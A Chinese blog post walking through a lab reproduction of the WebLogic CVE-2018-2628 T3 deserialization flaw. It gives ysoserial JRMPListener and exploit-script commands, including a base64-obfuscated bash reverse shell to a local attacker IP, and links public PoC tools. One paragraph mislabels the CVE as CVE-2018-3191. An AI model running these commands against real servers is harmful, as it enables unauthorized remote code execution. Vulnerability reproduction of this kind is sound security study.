---
layout: post
title: Weblogic WLS Core Components 反序列化命令执行漏洞
tags: WebLogic
categories: CVE-2018-2628
---

# Weblogic WLS Core Components 反序列化命令执行漏洞（CVE-2018-2628）

## 漏洞描述

该漏洞通过t3协议触发，可导致未授权的用户在远程服务器执行任意命令。

* T3协议
WebLogic Server 中的 RMI 通信使用 T3 协议在WebLogic Server和其他 Java程序（包括客户端及其他 WebLogic Server 实例）间传输数据（序列化的类）。由于WebLogic的T3协议和Web协议共用同一个端口，因此只要能访问WebLogic就可利用T3协议实现payload和目标服务器的通信。

* JRMP协议
RMI目前使用Java远程消息交换协议JRMP（Java Remote Messaging Protocol）进行通信。JRMP协议是专为Java的远程对象制定的协议。

## 漏洞复现

首先部署是使用的GitHub中的[vulhub](!https://github.com/vulhub/vulhub.git)项目docker一键部署的。
环境启动后，访问`http://your-ip:7001/console`，即可看到后台登录页面。

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Weblogic/CVE-2018-2628/15943579480726.jpg)

可以先通过使用Nmap探测靶机Weblogic服务的相关信息，发现靶机的Weblogic开启了T3协议，且属于受CVE-2018-3191影响的版本范围，因此，存在着漏洞风险。

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Weblogic/CVE-2018-2628/15948077101454.jpg)

1.使用ysoserial，并启动一个JRMP Server：

```
java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener [listener port] CommonsCollections1 [command]

其中，[command]为要执行的命令，而[listen port]是JRMP Server监听的端口。

如：
java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 6666 CommonsCollections1 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTAxLzc3NzcgMD4mMQ==}|{base64,-d}|{bash,-i}'
```

然后使用脚本[exploit](https://www.exploit-db.com/exploits/44553)

```
python exploit.py [victim ip] [victim port] [path to ysoserial] [JRMPListener ip] [JRMPListener port] [JRMPClient]

其中，[victim ip]和[victim port]是目标weblogic的IP和端口，[path to ysoserial]是本地ysoserial的路径，[JRMPListener ip]和[JRMPListener port]第一步中启动JRMP Server的IP地址和端口。[JRMPClient]是执行JRMPClient的类，可选的值是JRMPClient或JRMPClient2。

如：
python exp.py 192.168.x.x 7001 ysoserial-0.0.6-SNAPSHOT-all.jar 192.168.x.x 6666 JRMPClient
```

同时攻击机（即第一步中启动JRMP Server的机器）开启监听，成功反弹shell

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Weblogic/CVE-2018-2628/15943619302954.jpg)

2.使用[CVE-2018-2628-POC](https://github.com/jas502n/CVE-2018-2628)

地址<https://github.com/jas502n/CVE-2018-2628>

首先使用poc验证是否存在漏洞

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Weblogic/CVE-2018-2628/15944667286618.jpg)

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Weblogic/CVE-2018-2628/15944667726964.jpg)

然后使用exp来getshell

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Weblogic/CVE-2018-2628/15944671257388.jpg)

浏览器访问，成功执行命令

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Weblogic/CVE-2018-2628/15944672646154.jpg)

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Weblogic/CVE-2018-2628/15944672353700.jpg)

## 受影响的版本

10.3.6.0
12.1.3.0
12.2.1.2
12.2.1.3

## 参考链接

http://www.legendsec.org/1932.html